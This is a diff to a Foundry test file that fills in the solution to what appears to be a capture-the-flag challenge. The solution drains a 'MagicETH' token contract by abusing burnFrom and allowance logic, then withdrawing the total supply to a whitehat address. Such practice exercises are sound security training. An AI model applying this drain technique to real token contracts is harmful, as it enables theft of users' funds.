@@ -19,7 +19,7 @@ contract Challenge1Test is Test {
 
     address public exploiter = makeAddr("exploiter");
     address public whitehat = makeAddr("whitehat");
-
+    address public intermediary=makeAddr("intermediary");
     function setUp() public {
         mETH = new MagicETH();
 
@@ -36,12 +36,18 @@ contract Challenge1Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge1Test -vvvv //
         ////////////////////////////////////////////////////*/
-
-    
-
+        
+        mETH.approve(exploiter,1000000 ether);
+        mETH.burnFrom(exploiter,1000 ether);
+        vm.deal(whitehat, 1 wei);
+        mETH.deposit{value: 1 wei}();
+        mETH.withdraw(mETH.totalSupply());
+        mETH.balanceOf(whitehat);
+        payable(0).transfer(1 wei);
         //==================================================//
         vm.stopPrank();
 
         assertEq(whitehat.balance, 1000 ether, "whitehat should have 1000 ether");
     }
+
 }
